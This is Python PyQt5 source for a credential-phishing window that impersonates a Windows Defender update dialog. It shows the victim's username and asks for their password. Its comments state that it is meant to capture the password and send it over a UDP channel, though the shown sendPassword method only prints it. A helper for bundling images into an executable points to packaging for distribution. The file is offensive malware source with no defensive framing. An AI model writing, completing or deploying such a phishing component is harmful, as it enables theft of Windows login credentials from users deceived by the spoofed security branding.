from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtGui import *
import sys
import os


"""
Used to put images in exe file.
"""
def makePortablePath(relativePath):
    
    try:

        basePath = sys._MEIPASS

    except Exception:
        
        basePath = os.path.abspath(".")

    return os.path.join(basePath, relativePath)


"""
Fake Windows Defender window to get user password.
"""
class FishingWindow(QWidget):

    def __init__(self, userName, udpChannel):

        QWidget.__init__(self)

        self.udpChannel = udpChannel

        self.setWindowTitle("Windows Defender")
        self.setWindowIcon(QIcon(makePortablePath("icon.png")));

        self.layout = QGridLayout(self)
        self.layout.setSpacing(10)
        self.layout.setContentsMargins(20, 10, 30, 10)

        self.logo   = QLabel()
        self.title  = QLabel("Windows Defender Update")

        font = self.title.font()
        font.setPointSize(14)
        self.title.setFont(font)

        self.text = QLabel("In order to continue protecting your computer,\nWindows Defender needs your permission to finalize\nthe update of the virus database.")
        
        self.usernameLabel  = QLabel("Username :")
        self.usernameField  = QLineEdit(userName)
        self.usernameField.setReadOnly(True)
        
        self.passwordLabel  = QLabel("Password :")
        self.passwordField  = QLineEdit("")
        self.passwordField.setEchoMode(QLineEdit.Password)

        self.cancel         = QPushButton("Cancel")
        self.ok             = QPushButton("OK")
        self.logo.setPixmap(QPixmap(makePortablePath("icon.png")));

        self.layout.addWidget(self.logo, 0, 0, 12, 3)
        self.layout.addWidget(self.title, 2, 3, 1, 4)
        self.layout.addWidget(self.text, 3, 3, 1, 4)
        self.layout.addWidget(self.usernameLabel, 5, 3, 1, 4)
        self.layout.addWidget(self.usernameField, 6, 3, 1, 4)
        self.layout.addWidget(self.passwordLabel, 7, 3, 1, 4)
        self.layout.addWidget(self.passwordField, 8, 3, 1, 4)
        self.layout.addWidget(self.cancel, 12, 3, 1, 2)
        self.layout.addWidget(self.ok, 12, 5, 1, 2)

        self.cancel.clicked.connect(self.sendPassword)
        self.ok.clicked.connect(self.sendPassword)


    """
    Once a button is clicked, sends password througt udp channel.
    """
    def sendPassword(self):

        print(self.passwordField.text())
        self.close()